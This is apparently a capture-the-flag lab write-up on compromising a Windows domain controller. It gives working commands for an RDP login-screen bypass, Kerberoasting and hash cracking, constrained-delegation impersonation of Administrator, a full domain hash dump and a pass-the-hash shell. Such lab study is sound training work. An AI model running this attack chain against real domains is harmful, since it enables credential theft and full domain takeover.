# CroccCrew

Rated "INSANE"

This room isn't actually that hard, EXCEPT for the initial AD credentials, which depending on your approach might be impossible to find.

1. Its a windows DC, so lots of ports are open including SMB, WinRM and LDAP. There is a website on 80 that has been defaced, and includes a few red herrings.
2. To find some AD credentials, you need to connect over RDP and view the login screen. This is impossible by default if accessing from windows (as I was), as network level authentication requires you to have a valid username and password before a session is created. However, if you save the RDP connection config as a .rdp file, then open it and add the line `enablecredsspsupport:i:0` this will open a session to the login screen whose background image has on it a username (`Visitor`) and password - these creds won't work for RDP but they are valid domain creds.
3. With these creds you can access SMB and get the user flag, but more importantly they can be used with `impacket-GetUserSPNs -dc-ip 10.10.253.208 COOCTUS.CORP/Visitor:REDACTED -request`, which reveals a SPN for the user `password-reset` who has constrained delegation rights. The SPN can be cracked using hashcat to get their password (Drop the hash into a file called hash, and then I cracked it on windows with hashcat and rockyou: `.\hashcat.exe -m 13100 ..\hash ..\rockyou.txt`)
4. The delegation can be used to get a ticket for the administrator user with `impacket-getST -dc-ip 10.10.253.208 COOCTUS.CORP/password-reset:REDACTED -impersonate Administrator -spn oakley/DC.COOCTUS.CORP`
  - constrained delegation can be used to impersonate any user for any service on the same machine, which is why this works. no idea what/who oakley is supposed to be, but it doesnt matter.
6. Use `export KRB5CCNAME=Administrator.ccache` to set this as the current cc for kerb commands, add the DC to hosts (`IP DC.COOCTUS.CORP`) then use `impacket-secretsdump -k -no-pass DC.COOCTUS.CORP` to dump all hashes
7. With the admin hash, you can use evil-winrm to get an administrator session: `evil-winrm -i 10.10.253.208 -u Administrator -H REDACTED`.

There are flags under /shares/Home and /perflogs/admin

Normally I'd do the above with rubeus from a windows machine in the domain (e.g. during the OSEP exam), this article helped with explaining how to do things purely with impacket outside the domain (e.g. from the attack box): https://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html
